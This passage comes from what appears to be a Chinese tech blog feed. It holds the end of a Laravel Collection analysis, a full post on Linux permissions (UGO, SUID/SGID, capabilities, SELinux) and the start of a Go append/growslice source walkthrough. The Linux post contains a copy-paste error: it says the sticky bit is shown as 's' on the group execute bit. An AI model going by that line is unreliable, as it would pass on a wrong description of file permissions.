这个函数不会立即执行</span>        <span class="token keyword">return</span> <span class="token variable">$number</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 只有在实际使用时才会计算</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$lazyCollection</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 此时才真正执行 map 操作</span>    <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Collection 有很多使用的方法，比如按照对象的某个元素分组 groupBy，分块 chunk，扁平化 flatten，函数式编程（map、filter、reduce、every…）。还了解到 data_set,data_get,date_forget helper 系列函数负责使用「.」符号处理嵌套的数组。</p><p>从源码角度上分析学到了 PHP 接口和 Trait 的结合使用，闭包的设计，<code>__get()</code> <code>__call()</code> <code>__callStatic()</code> 的动态调用，使用 <code>func_num_args()</code> 方法实现方法重载。</p><div class="note note-primary">            <p><code>__get()</code>：当类不存在属性时调用这个方法<br><code>__call()</code>：当方法不存在时调用这个方法<br><code>__callStatic()</code>：当静态方法不存在时调用的方法<br><code>func_num_args()</code>：返回函数的参数个数</p>          </div>]]></content>
    
    
    <categories>
      
      <category>Tech</category>
      
    </categories>
    
    
    <tags>
      
      <tag>源码分析</tag>
      
      <tag>PHP</tag>
      
      <tag>Laravel</tag>
      
      <tag>Collection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 权限控制系统</title>
    <link href="/linux-permissions/"/>
    <url>/linux-permissions/</url>
    
    <content type="html"><![CDATA[<!--toc:start--><ul><li><a href="#why">Why</a></li><li><a href="#%E4%BC%A0%E7%BB%9F%E7%9A%84%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6ugo">传统的权限控制(UGO)</a></li><li><a href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90%E4%BD%8Dspecial-permissions">特殊权限位(Special Permissions)</a></li><li><a href="#capabilities">Capabilities</a><ul><li><a href="#capabilities">capabilities</a></li><li><a href="#capability-sets">Capability sets</a></li></ul></li><li><a href="#selinux">SELinux</a><ul><li><a href="#%E5%BC%BA%E5%88%B6%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-mac">强制访问控制 MAC</a></li><li><a href="#%E5%AE%89%E5%85%A8%E4%B8%8A%E4%B8%8B%E6%96%87security-context">安全上下文（Security Context）</a></li><li><a href="#%E7%AD%96%E7%95%A5policy">策略（Policy）</a></li><li><a href="#%E6%A8%A1%E5%BC%8Fmodes">模式（Modes）</a></li><li><a href="#%E5%B8%83%E5%B0%94%E5%80%BCbooleans">布尔值（Booleans）</a></li><li><a href="#%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6">工作机制</a><!--toc:end--></li></ul></li></ul><p>Linux 除了 rwx 权限之外，还有哪些权限呢？</p><span id="more"></span><h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>在开始介绍之前，先解释下为什么我会思考这个问题。</p><p>我写了一个 Golang 创建 ICMP 监听，代码如下：</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>p <span class="token operator">*</span>Pinger<span class="token punctuation">)</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span> conn<span class="token punctuation">,</span> err <span class="token operator">:=</span> icmp<span class="token punctuation">.</span><span class="token function">ListenPacket</span><span class="token punctuation">(</span><span class="token string">"ip4:icmp"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"error creating ICMP connection: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> p<span class="token punctuation">.</span>conn <span class="token operator">=</span> conn <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span></code></pre></div></figure><p>使用非 root 权限的用户运行时报错：error creating ICMP connection: listen ip4:icmp 0.0.0.0: socket: operation not permitted</p><p>这串代码其实是我在模拟 ping 的实现，在 Linux 里面，普通用户使用 ping 不会报错，为什么使用我的程序就会报错呢？查资料了解到 Linux 权限控制系统除了 rwx 之外，还存在一个 capabilities。</p><p>使用指令 <code>setcap cap_net_raw=eip my-program</code> 给程序加上运行创建 socket 的权限后，代码能够顺利运行。</p><h2 id="传统的权限控制-UGO"><a href="#传统的权限控制-UGO" class="headerlink" title="传统的权限控制(UGO)"></a>传统的权限控制(UGO)</h2><figure><div class="code-wrapper"><pre class="language-BASH" data-language="BASH"><code class="language-BASH">➜ ~ ls -ltotal 16drwxr-xr-x 3 ashark ashark 4096 Nov 10 16:35 code&#x2F;drwxr-xr-x 8 ashark ashark 4096 Oct 14 18:22 github&#x2F;drwxr-xr-x 3 ashark ashark 4096 Oct 26 19:09 project&#x2F;drwxr-xr-x 4 ashark ashark 4096 Nov 11 09:46 tmp&#x2F;</code></pre></div></figure><ul><li>第一个字母代表文件类型：文件类型(-)、目录(d)、符号链接(l)、块设备(b)、字符设备(c)、管道(p)、套接字(s)</li><li>权限分为三组：用户(u)、组(g)、其他(o)</li><li>每组包含读(r&#x3D;4)、写(w&#x3D;2)、执行(x&#x3D;1)权限</li><li>chmod 命令修改权限：chmod 764 file</li></ul><h2 id="特殊权限位-Special-Permissions"><a href="#特殊权限位-Special-Permissions" class="headerlink" title="特殊权限位(Special Permissions)"></a>特殊权限位(Special Permissions)</h2><ul><li>SUID (Set User ID)：当一个程序以 SUID 方式执行时，它的有效用户 ID 会临时变为文件所有者的 UID。这通常用于一些需要以特权用户身份运行的程序，如sudo。</li><li>SGID (Set Group ID)：与 SUID 类似，当一个程序以 SGID 方式执行时，它的有效组 ID 会临时变为文件所有者的 GID。</li><li>Sticky bit：这个权限位主要用于目录。当一个目录设置了sticky bit后，只有文件的所有者、超级用户和目录的所有者才能删除或重命名目录中的文件。这通常用于共享目录，以防止用户随意删除其他人的文件。</li><li>设置 SUID：<code>chmod u+s filename</code> 在文件所有者的 x 权限位上用 s 表示（如 x 变为 s）</li><li>设置 SGID：<code>chmod g+s dirname</code> 在组权限的 x 权限位上用 s 表示（如 x 变为 s ）</li><li>设置 Sticky bit：<code>chmod o+t dirname</code> 在组权限的 x 权限位上用 s 表示（如 x 变为 s）</li></ul><p>示例：</p><figure><div class="code-wrapper"><pre class="language-BASH" data-language="BASH"><code class="language-BASH">➜ ~ ls -l &#x2F;usr&#x2F;bin&#x2F;sudo &#x2F;usr&#x2F;bin&#x2F;passwd-rwsr-xr-x 1 root root  80888 Jul  2 19:16 &#x2F;usr&#x2F;bin&#x2F;passwd*-rwsr-xr-x 1 root root 257168 Nov 13 15:17 &#x2F;usr&#x2F;bin&#x2F;sudo*</code></pre></div></figure><p>这两个都设置了 SUID 权限，普通用户在执行 sudo 命令时，可以临时获得 root 权限。</p><div class="note note-primary">            <p>当然，sudo 执行时会检查 &#x2F;etc&#x2F;sudoers 文件，允许的用户和用户组才能够执行 sudo，比如 wheel 用户组</p>          </div><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p>从 Linux 2.2 开始，创建了一种机制，用于细粒度地控制进程或程序的权限，这就是 Capabilities。它将传统的 root（超级用户）权限拆分为更小的能力集，使得程序可以只获取执行其任务所需的特定权限，而不是完整的 root 权限。</p><p>Capabilities 相关指令：</p><figure><div class="code-wrapper"><pre class="language-BASH" data-language="BASH"><code class="language-BASH"># 查看当前进程的 Capabilitiescapsh --print# 查看文件当前的 capabilitiesgetcap &#x2F;path&#x2F;to&#x2F;file# 设置 capabilitiessetcap cap_net_raw&#x3D;eip &#x2F;path&#x2F;to&#x2F;file# 查看当前进程的 capabilitiesgetpcaps PID# 查看详细文档(如果找不到可以先安装，sudo pacman -S man-pages)man capabilities</code></pre></div></figure><p><img src="/../img/linux-permissions-getcap.jpg" alt="获取 ping 的 capabilities"></p><p>设置 Capabilities 需要指定赋予的 Capabilities 和其 sets。两者介绍如下：</p><h3 id="capabilities"><a href="#capabilities" class="headerlink" title="capabilities"></a>capabilities</h3><ul><li>CAP_CHOWN - 允许修改文件的所有者</li><li>CAP_DAC_OVERRIDE - 忽略文件的 DAC 访问限制</li><li>CAP_DAC_READ_SEARCH - 忽略文件读及目录搜索的 DAC 访问限制</li><li>CAP_FOWNER - 忽略文件权限检查</li><li>CAP_FSETID - 允许设置文件的 setuid&#x2F;setgid 位</li><li>CAP_KILL - 允许发送信号给任意进程</li><li>CAP_SETGID - 允许设置进程的组 ID</li><li>CAP_SETUID - 允许设置进程的用户 ID</li><li>CAP_SETPCAP - 允许修改进程的 capabilities</li><li>CAP_LINUX_IMMUTABLE - 允许修改文件的不可变(immutable)和只追加(append-only)属性</li><li>CAP_NET_BIND_SERVICE - 允许绑定小于 1024 的端口</li><li>CAP_NET_BROADCAST - 允许网络广播和多播访问</li><li>CAP_NET_ADMIN - 允许执行网络管理任务</li><li>CAP_NET_RAW - 允许使用原始套接字</li><li>CAP_IPC_LOCK - 允许锁定共享内存片段</li><li>CAP_IPC_OWNER - 忽略 IPC 所有权检查</li><li>CAP_SYS_MODULE - 允许加载和卸载内核模块</li><li>CAP_SYS_RAWIO - 允许直接访问 I&#x2F;O 端口</li><li>CAP_SYS_CHROOT - 允许使用 chroot()</li><li>CAP_SYS_PTRACE - 允许跟踪任何进程</li><li>CAP_SYS_PACCT - 允许配置进程记账</li><li>CAP_SYS_ADMIN - 允许执行系统管理操作</li><li>CAP_SYS_BOOT - 允许重启系统</li><li>CAP_SYS_NICE - 允许提升优先级和设置其他进程的优先级</li><li>CAP_SYS_RESOURCE - 忽略资源限制</li><li>CAP_SYS_TIME - 允许修改系统时钟</li><li>CAP_SYS_TTY_CONFIG - 允许配置 TTY 设备</li><li>CAP_MKNOD - 允许创建特殊文件</li><li>CAP_LEASE - 允许修改文件锁的 FL_LEASE 标志</li><li>CAP_AUDIT_WRITE - 允许向内核审计日志写入记录</li><li>CAP_AUDIT_CONTROL - 允许配置审计子系统</li><li>CAP_SETFCAP - 允许设置文件 capabilities</li><li>CAP_MAC_OVERRIDE - 允许忽略 MAC（强制访问控制）</li><li>CAP_MAC_ADMIN - 允许配置 MAC</li><li>CAP_SYSLOG - 允许使用 syslog()</li><li>CAP_WAKE_ALARM - 允许触发唤醒 alarm</li><li>CAP_BLOCK_SUSPEND - 允许阻止系统挂起</li><li>CAP_AUDIT_READ - 允许读取审计日志</li><li>CAP_PERFMON - 允许使用性能监控单元(PMU)</li><li>CAP_BPF - 允许创建 BPF 程序</li><li>CAP_CHECKPOINT_RESTORE - 允许检查点和恢复操作</li></ul><h3 id="Capability-sets"><a href="#Capability-sets" class="headerlink" title="Capability sets"></a>Capability sets</h3><p>在 Capabilities 的权限模型中，Permitted、Inheritable、Effective、Bounding 和 Ambient 是进程的能力集合，每个集合定义了进程在不同上下文下如何使用和限制其权限。前三个可以定义在可执行文件上面，也就是 eip 的缩写。</p><ul><li>Permitted Set：包含当前进程允许拥有的 Capabilities 集合。这是一个进程的核心权限集合，它定义了进程可能使用的能力范围。</li><li>Effective Set：当前进程实际正在使用的 Capabilities 集合，Effective Set 是 Permitted Set 的一个子集，即使某个 Capabilities 在 Permitted Set 中，也需要显式激活后才会出现在 Effective Set 中。</li><li>Inheritable Set：定义了哪些 Capabilities 可以从父进程继承到子进程。</li><li>Bounding Set：定义了进程能够拥有的 Capabilities 上限，即便是 root 用户也无法超出此集合。</li><li>Ambient Set：一个较新的 Capabilities 集合（引入于 Linux 4.3），用于在执行新程序时保留特定 Capabilities，而无需特殊文件权限或 execve 限制。</li></ul><h2 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h2><div class="note note-primary">            <p>目前，AppArmor 为 Ubuntu、OpenSUSE、SUSE、Debian 默认的 LSM；SELinux 为 RHEL、Fedora、CentOS 默认的 LSM。ArchLinux 默认不使用 LSM，需要单独安装启用。</p>          </div><p>SELinux（Security-Enhanced Linux）是由美国国家安全局（NSA）开发并集成到 Linux 内核中的一个 强制访问控制（Mandatory Access Control, MAC） 系统。它是 Linux 系统中增强安全性的一个重要模块，能够通过策略对系统中的所有对象（文件、进程、网络等）进行精细的权限管理，超越传统的用户权限和文件权限机制。</p><h3 id="强制访问控制-MAC"><a href="#强制访问控制-MAC" class="headerlink" title="强制访问控制 MAC"></a>强制访问控制 MAC</h3><p>自主访问控制（Discretionary Access Control, DAC）</p><ul><li>文件权限 (rwx) 和 owner。</li><li>任何拥有文件的用户都可以修改其权限或允许其他人访问。</li></ul><p>强制访问控制（Mandatory Access Controls, MAC）</p><ul><li>权限由系统管理员定义的安全策略决定，用户和程序无法任意修改。</li><li>即使用户具有 root 权限，也必须遵守 SELinux 策略。</li></ul><h3 id="安全上下文（Security-Context）"><a href="#安全上下文（Security-Context）" class="headerlink" title="安全上下文（Security Context）"></a>安全上下文（Security Context）</h3><p>每个对象（如文件、进程、设备、端口等）都被分配了一个安全上下文，通常由以下三部分组成：</p><figure><div class="code-wrapper"><pre class="language-text" data-language="text"><code class="language-text">user:role:type</code></pre></div></figure><ul><li><strong>User（用户）</strong>：SELinux 的安全用户（如 <code>system_u</code>、<code>user_u</code>）。</li><li><strong>Role（角色）</strong>：控制用户可以使用哪些类型的权限（如 <code>system_r</code>）。</li><li><strong>Type（类型）</strong>：核心部分，用于定义资源和进程的访问规则（如 <code>httpd_t</code> 或 <code>httpd_sys_content_t</code>）。</li></ul><h3 id="策略（Policy）"><a href="#策略（Policy）" class="headerlink" title="策略（Policy）"></a>策略（Policy）</h3><p>SELinux 的策略是访问控制规则的集合，定义了哪些操作被允许。例如：</p><ul><li>哪些进程可以访问哪些文件。</li><li>哪些网络端口可以被绑定。</li></ul><p>常见策略包括：</p><ul><li><strong>目标化（Targeted）</strong>：保护指定的系统服务（默认策略，限制系统中关键进程）。</li><li><strong>最小化（Minimal）</strong>：只有最少的控制。</li><li><strong>严格（Strict）</strong>：对系统中的所有进程和对象实施全面控制。</li></ul><h3 id="模式（Modes）"><a href="#模式（Modes）" class="headerlink" title="模式（Modes）"></a>模式（Modes）</h3><p>SELinux 有三种运行模式：</p><ul><li><strong>Enforcing</strong>（强制模式）：严格执行 SELinux 策略，拒绝不符合规则的访问。</li><li><strong>Permissive</strong>（宽容模式）：记录违规访问，但不实际阻止，用于调试和策略调整。</li><li><strong>Disabled</strong>（禁用模式）：完全关闭 SELinux 功能。</li></ul><p>可以通过以下命令查看当前模式：</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">getenforce</code></pre></div></figure><p>更改模式：</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> setenforce <span class="token number">0</span>  <span class="token comment"># 切换到 Permissive</span><span class="token function">sudo</span> setenforce <span class="token number">1</span>  <span class="token comment"># 切换到 Enforcing</span></code></pre></div></figure><h3 id="布尔值（Booleans）"><a href="#布尔值（Booleans）" class="headerlink" title="布尔值（Booleans）"></a>布尔值（Booleans）</h3><p>SELinux 中的布尔值允许管理员动态调整策略的行为，而无需修改策略文件。例如：</p><ul><li><p>允许或禁止 <code>httpd</code> 访问网络：</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> setsebool <span class="token parameter variable">-P</span> httpd_can_network_connect on</code></pre></div></figure></li></ul><h3 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h3><ol><li><p><strong>标签化（Labeling）</strong><br>SELinux 为系统中所有对象分配安全上下文标签（Label），包括：</p><ul><li><p>文件：通过 <code>ls -Z</code> 查看：</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-Z</span> /var/www/html/</code></pre></div></figure><p>输出示例：</p><figure><div class="code-wrapper"><pre class="language-none"><code class="language-none">drwxr-xr-x. root root system_u:object_r:httpd_sys_content_t:s0 index.html</code></pre></div></figure></li><li><p>进程：通过 <code>ps -Z</code> 查看：</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-Z</span> <span class="token operator">|</span> <span class="token function">grep</span> httpd</code></pre></div></figure></li></ul></li><li><p><strong>访问控制决策</strong></p><ul><li>每次访问（如读文件、绑定端口）都需要经过 SELinux 策略的检查。</li><li>SELinux 检查访问请求是否匹配允许规则，如果不匹配，则拒绝并记录日志。</li></ul></li><li><p><strong>日志记录</strong></p><ul><li><p>所有被拒绝的操作都会记录到 <code>/var/log/audit/audit.log</code> 文件中，可以通过工具解析：</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">ausearch <span class="token parameter variable">-m</span> avc</code></pre></div></figure></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Tech</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码分析--Go append</title>
    <link href="/go-append/"/>
    <url>/go-append/</url>
    
    <content type="html"><![CDATA[<p><code>func append (s [] T, vs ...T) [] T</code> 的增长原理</p><span id="more"></span><p>在学 Go 语言的过程中，了解到切片，同时学到了切片增长函数 append，在使用的过程中发现一些问题，所以研究源码记录一下。</p><h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>在官方的 <a href="https://go.dev/tour/moretypes/15">A tour of Go</a> 中，有这样一段代码</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">var</span> s <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token builtin">int</span> printSlice <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token comment">//append works on nil slices.</span> s <span class="token operator">=</span> <span class="token builtin">append</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> printSlice <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token comment">// The slice grows as needed.</span> s <span class="token operator">=</span> <span class="token builtin">append</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> printSlice <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token comment">// We can add more than one element at a time.</span> s <span class="token operator">=</span> <span class="token builtin">append</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> printSlice <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> printSlice <span class="token punctuation">(</span>s <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> fmt<span class="token punctuation">.</span>Printf <span class="token punctuation">(</span><span class="token string">"len=%d cap=%d %v\n"</span><span class="token punctuation">,</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">cap</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//result:</span><span class="token comment">//len=0 cap=0 []</span><span class="token comment">//len=1 cap=1 [0]</span><span class="token comment">//len=2 cap=2 [0 1]</span><span class="token comment">//len=5 cap=6 [0 1 2 3 4]</span></code></pre></div></figure><p>我发现一个规律：</p><figure><div class="code-wrapper"><pre class="language-none"><code class="language-none">len&#x3D;5 cap&#x3D;6len&#x3D;7 cap&#x3D;8len&#x3D;9 cap&#x3D;10len&#x3D;11 cap&#x3D;12</code></pre></div></figure><p>在 0-5 容量内，len 和 cap 保持一致，在 len&gt;5 对其进行扩容时，Go 似乎总是把 cap+2，然后我写了一段测试代码</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">var</span> nums <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token builtin">int</span> fmt<span class="token punctuation">.</span>Printf <span class="token punctuation">(</span><span class="token string">"初始状态:\n %v, len=%d, cap=%d\n"</span><span class="token punctuation">,</span> nums<span class="token punctuation">,</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">cap</span> <span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span> fmt<span class="token punctuation">.</span>Println <span class="token punctuation">(</span><span class="token string">"------------------------"</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>  toAdd <span class="token operator">:=</span> <span class="token builtin">make</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  nums <span class="token operator">=</span> <span class="token builtin">append</span> <span class="token punctuation">(</span>nums<span class="token punctuation">,</span> toAdd<span class="token operator">...</span><span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span>Printf <span class="token punctuation">(</span><span class="token string">"追加 %d 个元素 %v 后:\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> toAdd<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span>Printf <span class="token punctuation">(</span><span class="token string">"len=%d, cap=%d\n"</span><span class="token punctuation">,</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">cap</span> <span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span>Println <span class="token punctuation">(</span><span class="token string">"------------------------"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//result:</span><span class="token comment">// 初始状态:</span><span class="token comment">//  [], len=0, cap=0</span><span class="token comment">//------------------------</span><span class="token comment">// 追加 1 个元素 [0] 后:</span><span class="token comment">//len=1, cap=1</span><span class="token comment">//------------------------</span><span class="token comment">// 追加 2 个元素 [0] 后:</span><span class="token comment">//len=2, cap=2</span><span class="token comment">//------------------------</span><span class="token comment">// 追加 3 个元素 [0] 后:</span><span class="token comment">//len=3, cap=4</span><span class="token comment">//------------------------</span><span class="token comment">//...</span><span class="token comment">// 追加 5 个元素 [0] 后:</span><span class="token comment">//len=5, cap=8</span><span class="token comment">//------------------------</span><span class="token comment">//...</span><span class="token comment">// 追加 9 个元素 [0] 后:</span><span class="token comment">//len=9, cap=16</span><span class="token comment">//------------------------</span><span class="token comment">//...</span><span class="token comment">// 追加 17 个元素 [0] 后:</span><span class="token comment">//len=17, cap=32</span><span class="token comment">//......</span><span class="token comment">//......</span><span class="token comment">// ------------------------</span><span class="token comment">// 追加512个元素[0]后:</span><span class="token comment">// len=512, cap=512</span><span class="token comment">// ------------------------</span><span class="token comment">// 追加513个元素[0]后:</span><span class="token comment">// len=513, cap=848</span></code></pre></div></figure><p>发现 512 cap 以内是按照 2 的指数来增长的，和上面代码的区别在于，这里是循环调用 append 增加 1 个元素，所以我非常好奇 append 的底层原理是怎么实现的？</p><h2 id="append"><a href="#append" class="headerlink" title="append"></a><a href="https://pkg.go.dev/builtin#append">append</a></h2><p><img src="/../img/go_append_doc.jpg" alt="append 文档"></p><p>官方文档解释很简洁，当切片 cap 不够时，分配一个新数组存储，然后返回</p><p>当我点击进去时只能看到 append 的函数声明</p><p><img src="/../img/go_append_func_sign.jpg" alt="append 函数声明"></p><p>文件位于 go&#x2F;src&#x2F;builtin&#x2F;builtin.go，这个文件只包含声明（declarations），不包含实现（implementations）。它的主要目的是：</p><ul><li>为IDE提供类型信息</li><li>为开发者提供文档</li><li>为编译器提供类型检查信息</li></ul><p>寻找源码的过程被迫中断了，去哪找呢？</p><p>我尝试问 AI 发现，类似 <code>make</code>, <code>new</code>, <code>append</code>… 这些函数属于 Go 的 <code>builtin</code> 函数，他们不需要导包就能使用，也没有具体的函数体实现，而是由编译器直接处理。</p><p>又回到了找源码的问题，编译过程怎么查看？</p><p>可以通过指定编译参数来查看编译步骤，比如指定 <code>GOSSAFUNC=main</code> 查看 main 函数。</p><p>接下来我对一段简单的 append 代码生成编译阶段：</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">var</span> s <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span> s <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre></div></figure><p><img src="/../img/go_append_ssa.jpg" alt="生成编译阶段 html 文件"></p><p>通过上面步骤会在当前目录生成一个 <code>ssa.html</code> 文件。使用浏览器打开内容如下：</p><p><img src="/../img/go_append_ssa2.jpg" alt="main 函数的个各个编译阶段"></p><figure><div class="code-wrapper"><pre class="language-text" data-language="text"><code class="language-text">v13 (5) = StaticLECall &lt;[]int,mem> &#123;AuxCall&#123;runtime.growslice&#125;&#125; [64] v5 v9 v7 v8 v11 v12</code></pre></div></figure><p>重点看这行代码，append 实际上对应到了 <code>runtime.growslice</code>。</p><h2 id="growslice-nextslicecap"><a href="#growslice-nextslicecap" class="headerlink" title="growslice &amp; nextslicecap"></a>growslice &amp; nextslicecap</h2><p>接下来到官方源码目录下找到 <code>runtime.growslice</code>，位于 <code>src/runtime/slice.go</code> 文件中，函数体如下：</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// growslice allocates new backing store for a slice.</span><span class="token comment">//</span><span class="token comment">// arguments:</span><span class="token comment">//</span><span class="token comment">// oldPtr = pointer to the slice's backing array</span><span class="token comment">// newLen = new length (= oldLen + num)</span><span class="token comment">// oldCap = original slice's capacity.</span><span class="token comment">//    num = number of elements being added</span><span class="token comment">//     et = element type</span><span class="token comment">//</span><span class="token comment">// return values:</span><span class="token comment">//</span><span class="token comment">// newPtr = pointer to the new backing store</span><span class="token comment">// newLen = same value as the argument</span><span class="token comment">// newCap = capacity of the new backing store</span><span class="token comment">//</span><span class="token comment">// ......</span><span class="token keyword">func</span> <span class="token function">growslice</span><span class="token punctuation">(</span>oldPtr unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">,</span> newLen<span class="token punctuation">,</span> oldCap<span class="token punctuation">,</span> num <span class="token builtin">int</span><span class="token punctuation">,</span> et <span class="token operator">*</span>_type<span class="token punctuation">)</span></code></pre></div></figure><p>growslice 前面是一堆检查，后面是针对内存的优化处理，暂且略过，主要针对 <code>nextslicecap</code> 的代码进行研究</p><figure><div class="code-wrapper"><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">growslice</span><span class="token punctuation">(</span>oldPtr unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">,</span> newLen<span class="token punctuation">,</span> oldCap<span class="token punctuation">,</span> num <span class="token builtin">int</span><span class="token punctuation">,</span> et <span class="token operator">*</span>_type<span class="token punctuation">)</span> <span class="token operator">...</span> <span class="token comment">// 检查</span> newcap <span class="token operator">:=</span> <span class="token function">nextslicecap</span><span class="token punctuation">(</span>newLen<span class="token punctuation">,</span> oldCap<span class="token punctuation">)</span> <span class="token operator">...</span> <span class="token comment">// 分配内存</span><span class="token keyword">func</span> <span class="token function">nextslicecap</span><span class="token punctuation">(</span>newLen<span class="token punctuation">,</span> oldCap <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">&#123;</span> newcap <span class="token operator">:=</span> oldCap doublecap <span class="token operator">:=</span> newcap <span class="token operator">+</span> newcap <span class="token keyword">if</span> newLen <span class="token operator">></span> doublecap <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> newLen <span class="token punctuation">&#125;</span> <span class="token keyword">const</span> threshold <span class="token operator">=</span> <span class="token number">256</span> <span class="token keyword">if</span> oldCap <span class="token operator">&lt;</span> threshold <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> doublecap <span class="token punctuation">&#125;</span> <span class="token keyword">for</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Transition from growing 2x for small slices</span>  <span class="token comment">// to growing 1.25x for large slices. This formula</span>  <span class="token comment">// gives a smooth-ish transition between the two.</span>  newcap <span class="token operator">+=</span> <span class="token punctuation">(</span>newcap <span class="token operator">+</span> <span class="token 